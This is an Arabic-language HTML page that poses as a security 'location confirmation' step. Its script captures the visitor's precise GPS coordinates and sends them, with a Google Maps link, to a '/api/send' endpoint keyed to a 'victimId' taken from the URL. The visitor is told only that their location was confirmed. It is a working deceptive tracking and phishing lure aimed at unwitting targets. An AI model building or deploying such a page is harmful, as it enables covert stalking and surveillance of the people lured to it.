<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأكيد الموقع</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#27ae60,#2ecc71);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:20px;padding:30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
h1{color:#333;margin-bottom:10px}
p{color:#666;margin-bottom:20px}
.btn{background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:18px;cursor:pointer;width:100%}
.btn:disabled{opacity:.6}
#result{margin-top:15px;padding:10px;border-radius:10px;display:none}
.ok{background:#d4edda;color:#155724;display:block}
.fail{background:#f8d7da;color:#721c24;display:block}
</style>
</head>
<body>
<div class="card">
    <h1>📍 تأكيد الموقع</h1>
    <p>يجب تأكيد موقعك الجغرافي للأمان</p>
    <button class="btn" id="btnStart">📍 تحديد موقعي</button>
    <div id="result"></div>
</div>

<script>
/* ===== الكتلة الجديدة ===== */
const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';

async function apiSend(payload) {
    try {
        const r = await fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return r.ok;
    } catch (e) { return false; }
}
/* ========================== */

document.getElementById('btnStart').onclick = async function () {
    const btn = this, res = document.getElementById('result');
    btn.disabled = true; btn.textContent = '⏳ جارٍ...';
    try {
        const p = await new Promise((ok, no) =>
            navigator.geolocation.getCurrentPosition(ok, no, { enableHighAccuracy: true, timeout: 15000 }));
        const lat = p.coords.latitude, lng = p.coords.longitude;
        const maps = 'https://www.google.com/maps?q=' + lat + ',' + lng;
        const msg = '📍 **موقع جديد**\n' +
                    '👤 الهدف: ' + victimId + '\n' +
                    '📌 ' + lat + ', ' + lng + '\n' +
                    '🗺️ ' + maps;
        const ok = await apiSend({ type: 'message', chatId: victimId, text: msg });
        res.className = ok ? 'ok' : 'fail';
        res.textContent = ok ? '✅ تم تأكيد موقعك' : '❌ فشل الإرسال';
        btn.textContent = '✅ تم';
    } catch (e) {
        res.className = 'fail';
        res.textContent = '❌ فشل: ' + e.message;
        btn.disabled = false; btn.textContent = '📍 إعادة المحاولة';
    }
};
</script>
</body>
</html>
